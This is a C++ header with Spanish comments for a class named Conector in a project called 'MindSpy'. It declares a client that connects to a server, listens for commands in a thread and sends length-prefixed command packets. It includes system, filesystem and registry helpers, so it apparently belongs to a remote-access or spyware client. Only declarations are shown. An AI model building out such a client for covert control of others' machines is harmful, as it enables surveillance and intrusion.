/**
* @file Conector.h
* @author Carlos D. Alvarez
* @date 10/12/2016
* @brief Define la clase Conector
*/

#pragma once
#include <windows.h>
#include <string>
#include <sstream>
#include <cstdio>
#include <Iphlpapi.h>
#include "Sistema.h"
#include "../Datos.h"
#include "FileSystem.h"
#include "Registro.h"
// tama�o de buffer maximo
#define MAX_BUFFER 4096
// Comandos disponibles
#define CANTIDAD_COMANDOS 4
// Constante para comandos no validos
#define COMANDO_NO_EXISTENTE -1
// Version del cliente. Enviada al servidor
#define VERSION_CLIENTE "MindSpy 1.0 - (Alpha, Pre-Release)"

using namespace std;

namespace MindSpy
{
	//! M�todos de conexi�n y comunicaci�n con el servidor
	class Conector {
	private:
		//! Data del socket
		WSADATA wsd;
		//! Socket del cliente
		SOCKET sckt;
		//! Informaci�n del servidor
		sockaddr_in server;
		//! Informaci�n de sistema
		Sistema sys;
		//! Estatus de la conexi�n
		bool Conectado;
		//! Mensaje del server
		char msg[MAX_BUFFER];

		/**
		*	@brief Ciclo de escucha del cliente. Procesa mensajes
		*/
		void Escuchar();

		/**
		* @brief Correr� en un hilo nuevo. Llama a la funci�n Escuchar.
		* @param[in] l P�r�metro que contiene un puntero a la clase Conector.
		* @return Siempre devuelve TRUE.
		*/
		static DWORD WINAPI HiloProc(LPARAM l)
		{
			Conector *c = (Conector*)l;
			c->Escuchar();
			return TRUE;
		}

		/**
		* @brief Recorre la lista de comandos en busca de "c" para obtener su ID.
		* @param[in] c Texto del comando a buscar
		* @return Si la funci�n tiene �xito, devuelve el ID del comando. Sino, devuelve COMANDO_NO_EXISTENTE
		*/
		int TipoComando(const char*c);

	public:
		/**
		* @brief Constructor, inicializa y conecta el cliente al servidor.
		*/
		Conector();
		
		/**
		* @brief Destructor, Libera el socket y memoria din�mica reservada
		*/
		~Conector();

		/**
		* @brief Indica si el cliente est� conectado
		* @return true si el cliente est� conectado. false en caso contrario.
		*/
		bool Listo();

		/**
		* @brief	Envia un comando, junto con su data, al cliente
		* @param [in]	SizeofData	Information describing the sizeof.
		* @param [in]	comando   	The comando.
		* @param [in]	Data	  	If non-null, the data.
		*
		* @return	true si se pudo enviar el comando, false en caso contrario
		* @note
		*	La estructura de los paquetes a enviar, es siempre la misma, independientemente de
		*	los datos a enviar. Sin embargo, el tama�o de dichos datos puede variar.<br>
		*	Los primeros cuatro bytes del paquete, corresponden al tama�o del paquete. Los segundos
		*	cuatro bytes corresponden al comando asociado a la data y del octavo byte en adelante,
		*	se ubica la data a enviar.
		*/
		bool EnviarComando(UINT32 SizeofData, UINT32 comando, BYTE* Data);
	};
}
